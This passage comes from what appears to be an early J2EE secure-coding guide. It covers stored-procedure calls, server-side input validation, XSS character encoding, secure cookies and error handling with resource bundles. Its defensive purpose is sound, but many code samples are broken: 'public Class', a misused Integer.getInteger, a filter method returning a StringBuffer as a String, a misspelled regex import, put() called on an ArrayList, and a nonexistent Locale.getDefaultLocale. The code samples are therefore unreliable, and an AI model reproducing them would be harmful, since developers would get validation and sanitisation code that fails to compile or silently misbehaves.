              <text>[2] CallableStatement, which extends PreparedStatement to execute database SQL stored procedures.  This class inherits input setters from PreparedStatement (see [1] above).</text>
              <br />
              <br />
              <text>The following example assumes that this database stored procedure has been created:</text>
              <br />
              <br />
              <text>CREATE PROCEDURE select_user (@username varchar(20))</text>
              <br />
              <text>AS SELECT * FROM USERS WHERE USERNAME = @username;</text>
              <br />
              <br />
              <text>Example of how to use a CallableStatement in J2EE to execute the above stored procedure:</text>
              <br />
              <br />
              <code>  // J2EE PreparedStatemenet Example
  // Get a connection to the database
  Connection myConnection;
  if (isDataSourceEnabled()) {
      // using the DataSource to get a managed connection
      Context ctx = new InitialContext();
      myConnection = ((DataSource)ctx.lookup(datasourceName)).getConnection(dbUserName, dbPassword);
  } else {
      try {
          // using the DriverManager to get a JDBC connection
          Class.forName(jdbcDriverClassPath);
          myConnection = DriverManager.getConnection(jdbcURL, dbUserName, dbPassword);
      } catch (ClassNotFoundException e) {
          ...
      }
  }
  ...
  try {
      PreparedStatement myStatement = myConnection.prepareCall("{?= call select_user ?,?}");
      myStatement.setString(1, userNameField);
      myStatement.registerOutParameter(1, Types.VARCHAR);
      ResultSet rs = myStatement.executeQuery();
      ...
      rs.close();
  } catch (SQLException sqlException) {
      ...
  } finally {
      myStatement.close();
      myConnection.close();
  }
</code>
              <br />
              <br />
              <text>[3] Entity Bean, which represents an EJB business object in a persistent storage mechanism.  There are two types of entity beans: bean-managed and container-managed.  With bean-managed persistence, the developer is responsible of writing the SQL code to access the database (refer to sections [1] and [2] above).  With container-managed persistence, the EJB container automatically generates the SQL code.  As a result, the container is responsible of preventing malicious attempts to tamper with the generated SQL code.</text>
              <br />
              <br />
              <text>Example of how to use an Entity Bean in J2EE:</text>
              <br />
              <br />
              <code>  // J2EE EJB Example
  try {
      // lookup the User home interface
      UserHome userHome = (UserHome)context.lookup(User.class);    
      // find the User remote interface
      User = userHome.findByPrimaryKey(new UserKey(userNameField));    
      ...    
  } catch (Exception e) {
      ...
  }
</code>
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>N/A</text>
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>
              </text>
              <link target="http://java.sun.com/j2se/1.4.1/docs/api/java/sql/PreparedStatement.html">http://java.sun.com/j2se/1.4.1/docs/api/java/sql/PreparedStatement.html</link>
              <br />
              <text>
              </text>
              <link target="http://java.sun.com/j2se/1.4.1/docs/api/java/sql/CallableStatement.html">http://java.sun.com/j2se/1.4.1/docs/api/java/sql/CallableStatement.html</link>
              <br />
              <br />
              <br />
              <text>** Input Data Validation:</text>
              <br />
              <br />
              <text>While data validations may be provided as a user convenience on the client-tier, data validation must be performed on the server-tier using Servlets.  Client-side validations are inherently insecure because they can be easily bypassed, e.g. by disabling Javascript.</text>
              <br />
              <br />
              <text>A good design usually requires the web application framework to provide server-side utility routines to validate the following:</text>
              <br />
              <text>[1] Required field</text>
              <br />
              <text>[2] Field data type (all HTTP request parameters are Strings by default)</text>
              <br />
              <text>[3] Field length</text>
              <br />
              <text>[4] Field range</text>
              <br />
              <text>[5] Field options</text>
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>[7] Cookie values</text>
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <br />
              <text>A good practice is to implement the above routine as static methods in a "Validator" utility class.  The following sections describe an example validator class.</text>
              <br />
              <br />
              <text>[1] Required field</text>
              <br />
              <text>Always check that the field is not null and its length is greater than zero, excluding leading and trailing white spaces.  </text>
              <br />
              <br />
              <text>Example of how to validate required fields:</text>
              <br />
              <br />
              <code>  // Java example to validate required fields
  public Class Validator {
      ...
      public static boolean validateRequired(String value) {
          boolean isFieldValid = false;
          if (value != null &amp;&amp; value.trim().length() &gt; 0) {
              isFieldValid = true;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateRequired(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>[2] Field data type</text>
              <br />
              <text>In web applications, input parameters are poorly typed.  For example, all HTTP request parameters or cookie values are of type String.  The developer is responsible for verifying the input is of the correct data type.  Use the Java primitive wrapper classes to check if the field value can be safely converted to the desired primitive data type.</text>
              <br />
              <br />
              <text>Example of how to validate a numeric field (type int):</text>
              <br />
              <br />
              <code>  // Java example to validate that a field is an int number
  public Class Validator {
      ...
      public static boolean validateInt(String value) {
          boolean isFieldValid = false;
          try {
              Integer.parseInt(value);
              isFieldValid = true;
          } catch (Exception e) {
              isFieldValid = false;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  // check if the HTTP request parameter is of type int
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>A good practice is to convert all HTTP request parameters to their respective data types.  For example, the developer should store the "integerValue" of a request parameter in a request attribute and use it as shown in the following example:</text>
              <br />
              <br />
              <code>  // Example to convert the HTTP request parameter to a primitive wrapper data type
  // and store this value in a request attribute for further processing
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // convert fieldValue to an Integer
      Integer integerValue = Integer.getInteger(fieldValue);
      // store integerValue in a request attribute
      request.setAttribute("fieldName", integerValue);
  }
  ...
  // Use the request attribute for further processing
  Integer integerValue = (Integer)request.getAttribute("fieldName");
  ...
</code>
              <br />
              <br />
              <text>The primary Java data types that the application should handle:</text>
              <br />
              <text>- Byte</text>
              <br />
              <text>- Short</text>
              <br />
              <text>- Integer</text>
              <br />
              <text>- Long</text>
              <br />
              <text>- Float</text>
              <br />
              <text>- Double</text>
              <br />
              <text>- Date</text>
              <br />
              <br />
              <text>[3] Field length</text>
              <br />
              <text>Always ensure that the input parameter (whether HTTP request parameter or cookie value) is bounded by a minimum length and/or a maximum length.</text>
              <br />
              <br />
              <text>Example to validate that the length of the userName field is between 8 and 20 characters:</text>
              <br />
              <br />
              <code>  // Example to validate the field length
  public Class Validator {
      ...
      public static boolean validateLength(String value, int minLength, int maxLength) {
          String validatedValue = value;
          if (!validateRequired(value)) {
              validatedValue = "";
          }
          return (validatedValue.length() &gt;= minLength &amp;&amp;
                      validatedValue.length() &lt;= maxLength);
      }
      ...
  }
  ...
  String userName = request.getParameter("userName");
  if (Validator.validateRequired(userName)) {
      if (Validator.validateLength(userName, 8, 20)) {
          // userName is valid, continue further processing
          ...
      }
  }
</code>
              <br />
              <br />
              <text>[4] Field range</text>
              <br />
              <text>Always ensure that the input parameter is within a range as defined by the functional requirements.</text>
              <br />
              <br />
              <text>Example to validate that the input numberOfChoices is between 10 and 20:</text>
              <br />
              <br />
              <code>  // Example to validate the field range
  public Class Validator {
      ...
      public static boolean validateRange(int value, int min, int max) {
          return (value &gt;= min &amp;&amp; value &lt;= max);
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("numberOfChoices");
  if (Validator.validateRequired(fieldValue)) {
      if (Validator.validateInt(fieldValue)) {
          int numberOfChoices = Integer.parseInt(fieldValue);
          if (Validator.validateRange(numberOfChoices, 10, 20)) {
              // numberOfChoices is valid, continue processing request
              ...
          }
      }
  }
</code>
              <br />
              <br />
              <text>[5] Field options</text>
              <br />
              <text>Often, the web application presents the user with a set of options to choose from, e.g. using the SELECT HTML tag, but fails to perform server-side validation to ensure that the selected value is one of the allowed options.  Remember that a malicious user can easily modify any option value.  Always validate the selected user value against the allowed options as defined by the functional requirements.</text>
              <br />
              <br />
              <text>Example to validate the user selection against a list of allowed options:</text>
              <br />
              <br />
              <code>  // Example to validate user selection against a list of options
  public Class Validator {
      ...
      public static boolean validateOption(Object[] options, Object value) {
          boolean isValidValue = false;
          try {
              List list = Arrays.asList(options);
              if (list != null) {
                  isValidValue = list.contains(value);
              }
          } catch (Exception e) {
          }
          return isValidValue;
      }
      ...
  }
  ...
  // Allowed options
  String[] options = {"option1", "option2", "option3");
  // Verify that the user selection is one of the allowed options
  String userSelection = request.getParameter("userSelection");
  if (Validator.validateOption(options, userSelection)) {
      // valid user selection, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>[6] Field pattern</text>
              <br />
              <text>Always check that the user input matches a pattern as defined by the functionality requirements.  For example, if the userName field should only allow alpha-numeric characters, case insensitive, then use the following regular expression:</text>
              <br />
              <text>^[a-zA-Z0-9]*$</text>
              <br />
              <br />
              <text>Java 1.3 or earlier versions do not include any regular expression packages.  Apache Regular Expression Package (see Resources below) is recommended for use with Java 1.3 to resolve this lack of support.  Example to perform regular expression validation:</text>
              <br />
              <br />
              <code>  // Example to validate that a given value matches a specified pattern
  // using the Apache regular expression package
  import org.apache.regexp.RE;
  import org.apache.regexp.RESyntaxException;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
               RE r = new RE(expression);
               match = r.match(value);             
          }
          return match;
      }
      ...
  }
  ...
  // Verify that the userName request parameter is alpha-numeric
  String userName = request.getParameter("userName");
  if (Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      // userName is valid, continue processing request
      ...
  }
</code>
              <br />
              <br />
              <text>Java 1.4 introduced a new regular expression package (java.util.regex).  Here is a modified version of Validator.matchPattern using the new Java 1.4 regular expression package:</text>
              <br />
              <br />
              <code>  // Example to validate that a given value matches a specified pattern
  // using the Java 1.4 regular expression package
  import java.util.regex.Pattern;
  import java.util.regexe.Matcher;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
              match = Pattern.matches(expression, value);
          }
          return match;
      }
      ...
  }
</code>
              <br />
              <br />
              <text>[7] Cookie value</text>
              <br />
              <text>Use the javax.servlet.http.Cookie object to validate the cookie value.  The same validation rules (described above) apply to cookie values depending on the application requirements, e.g. validate a required value, validate length, etc.</text>
              <br />
              <br />
              <text>Example to validate a required cookie value:</text>
              <br />
              <br />
              <code>  // Example to validate a required cookie value
  // First retrieve all available cookies submitted in the HTTP request
  Cookie[] cookies = request.getCookies();
  if (cookies != null) {
      // find the "user" cookie
      for (int i=0; i&lt;cookies.length; ++i) {
          if (cookies[i].getName().equals("user")) {
              // validate the cookie value
              if (Validator.validateRequired(cookies[i].getValue()) {
                  // valid cookie value, continue processing request
                  ...
              }
          }    
      }
  }
</code>
              <br />
              <br />
              <text>[8] HTTP Response</text>
              <br />
              <text>[8-1] Filter user input</text>
              <br />
              <text>To guard the application against cross-site scripting, sanitize HTML by converting sensitive characters to their corresponding character entities.  These are the HTML sensitive characters:</text>
              <br />
              <text>&lt; &gt; " ' % ; ) ( &amp; +</text>
              <br />
              <br />
              <text>Example to filter a specified string by converting sensitive characters to their corresponding character entities:</text>
              <br />
              <br />
              <code>  // Example to filter sensitive data to prevent cross-site scripting
  public Class Validator {
      ...
      public static String filter(String value) {
          if (value == null) {
              return null;
          }        
          StringBuffer result = new StringBuffer(value.length());
          for (int i=0; i&lt;value.length(); ++i) {
              switch (value.charAt(i)) {
              case '&lt;':
                  result.append("&amp;lt;");
                  break;
              case '&gt;': 
                  result.append("&amp;gt;");
                  break;
              case '"': 
                  result.append("&amp;quot;");
                  break;
              case '\'': 
                  result.append("&amp;#39;");
                  break;
              case '%': 
                  result.append("&amp;#37;");
                  break;
              case ';': 
                  result.append("&amp;#59;");
                  break;
              case '(': 
                  result.append("&amp;#40;");
                  break;
              case ')': 
                  result.append("&amp;#41;");
                  break;
              case '&amp;': 
                  result.append("&amp;amp;");
                  break;
              case '+':
                  result.append("&amp;#43;");
                  break;
              default:
                  result.append(value.charAt(i));
                  break;
          }        
          return result;
      }
      ...
  }
  ...
  // Filter the HTTP response using Validator.filter
  PrintWriter out = response.getWriter();
  // set output response
  out.write(Validator.filter(response));
  out.close();
</code>
              <br />
              <br />
              <text>The Java Servlet API 2.3 introduced Filters, which supports the interception and transformation of HTTP requests or responses.</text>
              <br />
              <br />
              <text>Example of using a Servlet Filter to sanitize the response using Validator.filter:</text>
              <br />
              <br />
              <code>  // Example to filter all sensitive characters in the HTTP response using a Java Filter.
  // This example is for illustration purposes since it will filter all content in the response, including HTML tags!
  public class SensitiveCharsFilter implements Filter {
      ...
      public void doFilter(ServletRequest request,
                      ServletResponse response,
                      FilterChain chain)
              throws IOException, ServletException {
          PrintWriter out = response.getWriter();
          ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response);
          chain.doFilter(request, wrapper);
          CharArrayWriter caw = new CharArrayWriter();
          caw.write(Validator.filter(wrapper.toString()));
          
          response.setContentType("text/html");
          response.setContentLength(caw.toString().length());
          out.write(caw.toString());
          out.close();
      }
      ...
      public class CharResponseWrapper extends HttpServletResponseWrapper {
          private CharArrayWriter output;
          public String toString() {
              return output.toString();
          }
      
          public CharResponseWrapper(HttpServletResponse response){
              super(response);
              output = new CharArrayWriter();
          }
          
          public PrintWriter getWriter(){
              return new PrintWriter(output);
          }
      }
  } 
  }
</code>
              <br />
              <br />
              <text>[8-2] Secure the cookie</text>
              <br />
              <text>When storing sensitive data in a cookie, make sure to set the secure flag of the cookie in the HTTP response, using Cookie.setSecure(boolean flag) to instruct the browser to send the cookie  using  a secure protocol, such as HTTPS or SSL.</text>
              <br />
              <br />
              <text>Example to secure the "user" cookie:</text>
              <br />
              <br />
              <code>  // Example to secure a cookie, i.e. instruct the browser to
  // send the cookie using a secure protocol
  Cookie cookie = new Cookie("user", "sensitive");
  cookie.setSecure(true);
  response.addCookie(cookie);
</code>
              <br />
              <br />
              <text>RECOMMENDED JAVA TOOLS</text>
              <br />
              <text>The two main Java frameworks for server-side validation are:</text>
              <br />
              <text>[1] Jakarta Commons Validator (integrated with Struts 1.1)</text>
              <br />
              <text>The Jakarta Commons Validator is a powerful framework that implements all the above data validation requirements.  These rules are configured in an XML file that defines input validation rules for form fields.  Struts supports output filtering of dangerous characters in the [8] HTTP Response by default on all data written using the Struts 'bean:write' tag.  This filtering may be disabled by setting the 'filter=false' flag.</text>
              <br />
              <br />
              <text>Struts defines the following basic input validators, but custom validators may also be defined:</text>
              <br />
              <text>required: succeeds if the field contains any characters other than whitespace.</text>
              <br />
              <text>mask: succeeds if the value matches the regular expression given by the mask attribute.</text>
              <br />
              <text>range: succeeds if the value is within the values given by the min and max attributes ((value &gt;= min) &amp; (value &lt;= max)).</text>
              <br />
              <text>maxLength: succeeds if the field is length is less than or equal to the max attribute.</text>
              <br />
              <text>minLength: succeeds if the field is length is greater than or equal to the min attribute.</text>
              <br />
              <text>byte, short, integer, long, float, double: succeeds if the value can be converted to the corresponding primitive.</text>
              <br />
              <text>date: succeeds if the value represents a valid date. A date pattern may be provided.</text>
              <br />
              <text>creditCard: succeeds if the value could be a valid credit card number.</text>
              <br />
              <text>email: succeeds if the value could be a valid e-mail address.</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using Struts Validator:</text>
              <br />
              <code>  &lt;form-validation&gt;
      &lt;global&gt;
          ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
          ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
          ...
          &lt;/form&gt;
          ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</code>
              <br />
              <br />
              <text>[2] JavaServer Faces Technology</text>
              <br />
              <text>JavaServer Faces Technology is a set of Java APIs (JSR 127) to represent UI components, manage their state, handle events and input validation.</text>
              <br />
              <br />
              <text>The JavaServer Faces API implements the following basic validators, but custom validators may be defined:</text>
              <br />
              <text>validate_doublerange: registers a DoubleRangeValidator on a component</text>
              <br />
              <text>validate_length: registers a LengthValidator on a component</text>
              <br />
              <text>validate_longrange: registers a LongRangeValidator on a component</text>
              <br />
              <text>validate_required: registers a RequiredValidator on a component</text>
              <br />
              <text>validate_stringrange: registers a StringRangeValidator on a component</text>
              <br />
              <text>validator: registers a custom Validator on a component</text>
              <br />
              <br />
              <text>The JavaServer Faces API defines the following UIInput and UIOutput Renderers (Tags):</text>
              <br />
              <text>input_date: accepts a java.util.Date formatted with a java.text.Date instance</text>
              <br />
              <text>output_date: displays a java.util.Date formatted with a java.text.Date instance</text>
              <br />
              <text>input_datetime: accepts a java.util.Date formatted with a java.text.DateTime instance</text>
              <br />
              <text>output_datetime: displays a java.util.Date formatted with a java.text.DateTime instance</text>
              <br />
              <text>input_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text>
              <br />
              <text>output_number: displays a numeric data type (java.lang.Number or primitive), formatted with a java.text.NumberFormat</text>
              <br />
              <text>input_text: accepts a text string of one line.</text>
              <br />
              <text>output_text: displays a text string of one line.</text>
              <br />
              <text>input_time: accepts a java.util.Date, formatted with a java.text.DateFormat time instance</text>
              <br />
              <text>output_time: displays a java.util.Date, formatted with a java.text.DateFormat time instance</text>
              <br />
              <text>input_hidden: allows a page author to include a hidden variable in a page</text>
              <br />
              <text>input_secret: accepts one line of text with no spaces and displays it as a set of asterisks as it is typed</text>
              <br />
              <text>input_textarea: accepts multiple lines of text</text>
              <br />
              <text>output_errors: displays error messages for an entire page or error messages associated with a specified client identifier</text>
              <br />
              <text>output_label: displays a nested component as a label for a specified input field</text>
              <br />
              <text>output_message: displays a localized message</text>
              <br />
              <br />
              <text>Example to validate the userName field of a loginForm using JavaServer Faces:</text>
              <br />
              <code>  &lt;%@ taglib uri="http://java.sun.com/jsf/html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://java.sun.com/jsf/core" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</code>
              <br />
              <br />
              <br />
              <text>REFERENCES</text>
              <br />
              <text>Java API 1.3 - </text>
              <link target="http://java.sun.com/j2se/1.3/docs/api/">http://java.sun.com/j2se/1.3/docs/api/</link>
              <br />
              <text>Java API 1.4 - </text>
              <link target="http://java.sun.com/j2se/1.4/docs/api/">http://java.sun.com/j2se/1.4/docs/api/</link>
              <br />
              <text>Java Servlet API 2.3 - </text>
              <link target="http://java.sun.com/products/servlet/2.3/javadoc/">http://java.sun.com/products/servlet/2.3/javadoc/</link>
              <br />
              <text>Java Regular Expression Package - </text>
              <link target="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</link>
              <br />
              <text>Jakarta Validator - </text>
              <link target="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</link>
              <br />
              <text>JavaServer Faces Technology - </text>
              <link target="http://java.sun.com/j2ee/javaserverfaces/">http://java.sun.com/j2ee/javaserverfaces/</link>
              <br />
              <br />
              <text>** Error Handling:</text>
              <br />
              <br />
              <text>Many J2EE web application architectures follow the Model View Controller (MVC) pattern.  In this pattern a Servlet acts as a Controller.  A Servlet delegates the application processing to a JavaBean such as an EJB Session Bean (the Model).  The Servlet then forwards the request to a JSP (View) to render the processing results.  Servlets should check all input, output, return codes, error codes and known exceptions to ensure that the expected processing actually occurred.</text>
              <br />
              <br />
              <text>While data validation protects applications against malicious data tampering, a sound error handling strategy is necessary to prevent the application from inadvertently disclosing internal error messages such as exception stack traces.  A good error handling strategy addresses the following items:</text>
              <br />
              <br />
              <text>[1] Defining Errors</text>
              <br />
              <text>[2] Reporting Errors</text>
              <br />
              <text>[3] Rendering Errors</text>
              <br />
              <text>[4] Error Mapping</text>
              <br />
              <br />
              <text>[1] Defining Errors</text>
              <br />
              <text>Hard-coded error messages in the application layer (e.g. Servlets) should be avoided.  Instead, the application should use error keys that map to known application failures.  A good practice is to define error keys that map to validation rules for HTML form fields or other bean properties.  For example, if the "user_name" field is required, is alphanumeric, and must be unique in the database, then the following error keys should be defined:</text>
              <br />
              <br />
              <text>(a) ERROR_USERNAME_REQUIRED: this error key is used to display a message notifying the user that the "user_name" field is required;</text>
              <br />
              <text>(b) ERROR_USERNAME_ALPHANUMERIC: this error key is used to display a message notifying the user that the "user_name" field should be alphanumeric;</text>
              <br />
              <text>(c) ERROR_USERNAME_DUPLICATE: this error key is used to display a message notifying the user that the "user_name" value is a duplicate in the database;</text>
              <br />
              <text>(d) ERROR_USERNAME_INVALID: this error key is used to display a generic message notifying the user that the "user_name" value is invalid;</text>
              <br />
              <br />
              <text>A good practice is to define the following framework Java classes which are used to store and report application errors:</text>
              <br />
              <br />
              <text>- ErrorKeys: defines all error keys</text>
              <br />
              <br />
              <code>      // Example: ErrorKeys defining the following error keys:    
      //    - ERROR_USERNAME_REQUIRED
      //    - ERROR_USERNAME_ALPHANUMERIC
      //    - ERROR_USERNAME_DUPLICATE
      //    - ERROR_USERNAME_INVALID
      //    ...
      public Class ErrorKeys {
          public static final String ERROR_USERNAME_REQUIRED = "error.username.required";
          public static final String ERROR_USERNAME_ALPHANUMERIC = "error.username.alphanumeric";
          public static final String ERROR_USERNAME_DUPLICATE = "error.username.duplicate";
          public static final String ERROR_USERNAME_INVALID = "error.username.invalid";
          ...
      }
</code>
              <br />
              <indentText>    </indentText>
              <text>- Error: encapsulates an individual error</text>
              <br />
              <br />
              <code>      // Example: Error encapsulates an error key.
      // Error is serializable to support code executing in multiple JVMs.
      public Class Error implements Serializable {
          
          // Constructor given a specified error key
          public Error(String key) {
              this(key, null);
          }
          
          // Constructor given a specified error key and array of placeholder objects
          public Error(String key, Object[] values) {
              this.key = key;
              this.values = values;
          }
          
          // Returns the error key
          public String getKey() {
              return this.key;
          }
          
          // Returns the placeholder values
          public Object[] getValues() {
              return this.values;
          }
          
          private String key = null;
          private Object[] values = null;
      }    
</code>
              <br />
              <br />
              <text>- Errors: encapsulates a Collection of errors</text>
              <br />
              <br />
              <code>      // Example: Errors encapsulates the Error objects being reported to the presentation layer.
      // Errors are stored in a HashMap where the key is the bean property name and value is an
      // ArrayList of Error objects.
      public Class Errors implements Serializable {
      
          // Adds an Error object to the Collection of errors for the specified bean property.
          public void addError(String property, Error error) {
              ArrayList propertyErrors = (ArrayList)errors.get(property);
              if (propertyErrors == null) {
                  propertyErrors = new ArrayList();
                  errors.put(property, propertyErrors);
              }
              propertyErrors.put(error);            
          }
          
          // Returns true if there are any errors
          public boolean hasErrors() {
              return (errors.size &gt; 0);
          }
          
          // Returns the Errors for the specified property
          public ArrayList getErrors(String property) {
              return (ArrayList)errors.get(property);
          }
          private HashMap errors = new HashMap();
      }
</code>
              <br />
              <br />
              <text>Using the above framework classes, here is an example to process validation errors of the "user_name" field:</text>
              <br />
              <br />
              <code>  // Example to process validation errors of the "user_name" field.
  Errors errors = new Errors();
  String userName = request.getParameter("user_name");
  // (a) Required validation rule
  if (!Validator.validateRequired(userName)) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_REQUIRED));
  } // (b) Alpha-numeric validation rule
  else if (!Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_ALPHANUMERIC));
  }
  else
  {
      // (c) Duplicate check validation rule
      // We assume that there is an existing UserValidationEJB session bean that implements
      // a checkIfDuplicate() method to verify if the user already exists in the database.
      try {
          ...        
          if (UserValidationEJB.checkIfDuplicate(userName)) {
              errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE));
          }
      } catch (RemoteException e) {
          // log the error
          logger.error("Could not validate user for specified userName: " + userName);
          errors.addError("user_name", new Error(ErrorKeys.ERROR_USERNAME_DUPLICATE);
      }
  }
  // set the errors object in a request attribute called "errors"
  request.setAttribute("errors", errors);
  ...
</code>
              <br />
              <br />
              <text>[2] Reporting Errors</text>
              <br />
              <text>There are two ways to report web-tier application errors:</text>
              <br />
              <text>(a) Servlet Error Mechanism</text>
              <br />
              <text>(b) JSP Error Mechanism</text>
              <br />
              <br />
              <text>[2-a] Servlet Error Mechanism</text>
              <br />
              <text>A Servlet may report errors by:</text>
              <br />
              <text>- forwarding to the input JSP (having already stored the errors in a request attribute), OR</text>
              <br />
              <text>- calling response.sendError with an HTTP error code argument, OR</text>
              <br />
              <text>- throwing an exception</text>
              <br />
              <br />
              <text>It is good practice to process all known application errors (as described in section [1]), store them in a request attribute, and forward to the input JSP. The input JSP should display the error messages and prompt the user to re-enter the data.  The following example illustrates how to forward to an input JSP (userInput.jsp):</text>
              <br />
              <br />
              <code>  // Example to forward to the userInput.jsp following user validation errors
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd != null) {
      rd.forward(request, response);
  }
</code>
              <br />
              <br />
              <text>If the Servlet cannot forward to a known JSP page, the second option is to report an error using the response.sendError method with HttpServletResponse.SC_INTERNAL_SERVER_ERROR (status code 500) as argument.  Refer to the javadoc of javax.servlet.http.HttpServletResponse for more details on the various HTTP status codes.  Example to return a HTTP error:</text>
              <br />
              <br />
              <code>  // Example to return a HTTP error code
  RequestDispatcher rd = getServletContext().getRequestDispatcher("/user/userInput.jsp");
  if (rd == null) {
      // messages is a resource bundle with all message keys and values
      response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR,
                              messages.getMessage(ErrorKeys.ERROR_USERNAME_INVALID));
  }
</code>
              <br />
              <br />
              <text>As a last resort, Servlets can throw an exception, which must be a subclass of one of the following classes:</text>
              <br />
              <text>- RuntimeException</text>
              <br />
              <text>- ServletException</text>
              <br />
              <text>- IOException</text>
              <br />
              <br />
              <text>[2-b] JSP Error Mechanism</text>
              <br />
              <text>JSP pages provide a mechanism to handle runtime exceptions by defining an errorPage directive as shown in the following example:</text>
              <br />
              <br />
              <code>      &lt;%@ page errorPage="/errors/userValidation.jsp" %&gt;
</code>
              <br />
              <br />
              <text>Uncaught JSP exceptions are forwarded to the specified errorPage, and the original exception is set in a request parameter called javax.servlet.jsp.jspException.  The error page must include a isErrorPage directive as shown below:</text>
              <br />
              <br />
              <code>      &lt;%@ page isErrorPage="true" %&gt;
</code>
              <br />
              <br />
              <text>The isErrorPage directive causes the "exception" variable to be initialized to the exception object being thrown.</text>
              <br />
              <br />
              <text>[3] Rendering Errors</text>
              <br />
              <text>The J2SE Internationalization APIs provide utility classes for externalizing application resources and formatting messages including:</text>
              <br />
              <br />
              <text>(a) Resource Bundles</text>
              <br />
              <text>(b) Message Formatting</text>
              <br />
              <br />
              <text>[3-a] Resource Bundles</text>
              <br />
              <text>Resource bundles support internationalization by separating localized data from the source code that uses it.  Each resource bundle stores a map of key/value pairs for a specific locale.</text>
              <br />
              <br />
              <text>It is common to use or extend java.util.PropertyResourceBundle, which stores the content in an external properties file as shown in the following example:</text>
              <br />
              <br />
              <code>  ################################################
  # ErrorMessages.properties
  ################################################
  # required user name error message
  error.username.required=User name field is required
  # invalid user name format
  error.username.alphanumeric=User name must be alphanumeric
  # duplicate user name error message
  error.username.duplicate=User name {0} already exists, please choose another one
  ...
</code>
              <br />
              <br />
              <text>Multiple resources can be defined to support different locales (hence the name resource bundle).  For example, ErrorMessages_fr.properties can be defined to support the French member of the bundle family.  If the resource member of the requested locale does not exist, the default member is used.  In the above example, the default resource is ErrorMessages.properties.  Depending on the user's locale, the application (JSP or Servlet) retrieves content from the appropriate resource.</text>
              <br />
              <br />
              <text>[3-b] Message Formatting</text>
              <br />
              <text>The J2SE standard class java.util.MessageFormat provides a generic way to create messages with replacement placeholders.  A MessageFormat object contains a pattern string with embedded format specifiers as shown below:</text>
              <br />
              <br />
              <code>  // Example to show how to format a message using placeholder parameters
  String pattern = "User name {0} already exists, please choose another one";
  String userName = request.getParameter("user_name");
  Object[] args = new Object[1];
  args[0] = userName;
  String message = MessageFormat.format(pattern, args);
</code>
              <br />
              <br />
              <text>Here is a more comprehensive example to render error messages using ResourceBundle and MessageFormat:</text>
              <br />
              <br />
              <code>  // Example to render an error message from a localized ErrorMessages resource (properties file)
  // Utility class to retrieve locale-specific error messages
  public Class ErrorMessageResource {
      
      // Returns the error message for the specified error key in the environment locale
      public String getErrorMessage(String errorKey) {
          return getErrorMessage(errorKey, defaultLocale);
      }
      
      // Returns the error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Locale locale) {
          return getErrorMessage(errorKey, null, locale);
      }
      
      // Returns a formatted error message for the specified error key in the specified locale
      public String getErrorMessage(String errorKey, Object[] args, Locale locale) {    
          // Get localized ErrorMessageResource
          ResourceBundle errorMessageResource = ResourceBundle.getBundle("ErrorMessages", locale);
          // Get localized error message
          String errorMessage = errorMessageResource.getString(errorKey);
          if (args != null) {
              // Format the message using the specified placeholders args
              return MessageFormat.format(errorMessage, args);
          } else {
              return errorMessage;
          }
      }
      
      // default environment locale
      private Locale defaultLocale = Locale.getDefaultLocale();
  }
  ...
  // Get the user's locale
  Locale userLocale = request.getLocale();
